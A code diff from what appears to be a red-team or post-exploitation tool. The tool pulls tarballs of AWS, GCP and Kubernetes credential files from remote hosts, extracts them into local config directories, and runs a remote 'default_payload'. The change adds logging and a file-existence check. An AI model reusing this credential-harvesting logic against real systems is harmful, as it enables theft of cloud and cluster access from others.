@@ -335,7 +335,10 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                         file = tarfile.open(f'/tmp/{hostname}_aws_creds.tgz')
                         for m in file.getmembers():
                             if m.isfile() and (m.path.endswith('/.aws/credentials') or m.path.endswith('/.aws/config')):
-                                file.extract(m.path, task_path)
+                                session.log(f"extracting: {m.path} => {task_path}")
+                                file.extract(m, task_path)
+                                session.log(f"copying: {Path.joinpath(
+                                task_path, m.path)} => {Path.joinpath(aws_dir, os.path.basename(m.path))}")
                                 shutil.copy2(Path.joinpath(
                                     task_path, m.path), Path.joinpath(aws_dir, os.path.basename(m.path)))
                                 break
@@ -369,7 +372,10 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                         file = tarfile.open(f'/tmp/{hostname}_gcp_creds.tgz')
                         for m in file.getmembers():
                             if m.isfile() and m.path.endswith('/.config/gcloud/credentials.json') and (m.path.startswith('root') or m.path.startswith('home')):
-                                file.extract(m.path, task_path)
+                                session.log(f"extracting: {m.path} => {task_path}")
+                                file.extract(m, task_path)
+                                session.log(f"copying: {Path.joinpath(
+                                task_path, m.path)} => {Path.joinpath(gcp_dir, os.path.basename(m.path))}")
                                 shutil.copy2(Path.joinpath(
                                     task_path, m.path), Path.joinpath(gcp_dir, os.path.basename(m.path)))
                                 break
@@ -394,7 +400,10 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     file = tarfile.open(f'/tmp/{hostname}_kube_creds.tgz')
                     for m in file.getmembers():
                         if m.isfile() and (m.path.endswith('/.kube/config')):
-                            file.extract(m.path, task_path)
+                            session.log(f"extracting: {m.path} => {task_path}")
+                            file.extract(m, task_path)
+                            session.log(f"copying: {Path.joinpath(
+                            task_path, m.path)} => {Path.joinpath(kube_dir, os.path.basename(m.path))}")
                             shutil.copy2(Path.joinpath(
                                 task_path, m.path), Path.joinpath(kube_dir, os.path.basename(m.path)))
                             break
@@ -485,13 +494,20 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 session.log("done")
 
                 # extract kube s3 prod files
-                file = tarfile.open(f'/tmp/{os.path.basename(file)}')
-                for m in file.getmembers():
-                    if m.isfile():
-                        file.extract(m.path, task_path)
-                        shutil.copy2(Path.joinpath(
-                            task_path, m.path), Path.joinpath("/tmp", os.path.basename(m.path)))
-                        break
+                if Path(f'/tmp/{os.path.basename(files[0])}').exists():
+                    file = tarfile.open(f'/tmp/{os.path.basename(files[0])}')
+                    for m in file.getmembers():
+                        if m.isfile():
+                            session.log(f"extracting: {m.path} => {task_path}")
+                            file.extract(m, task_path)
+                            session.log(f"copying: {Path.joinpath(
+                                task_path, m.path)} => {Path.joinpath("/tmp", os.path.basename(m.path))}")
+                            shutil.copy2(Path.joinpath(
+                                task_path, m.path), Path.joinpath("/tmp", os.path.basename(m.path)))
+                            break
+                else:
+                    session.log(
+                        f"kube tar not found: /tmp/{os.path.basename(files[0])}")
             else:
                 result = run_remote(session, default_payload)
                 session.log(result)
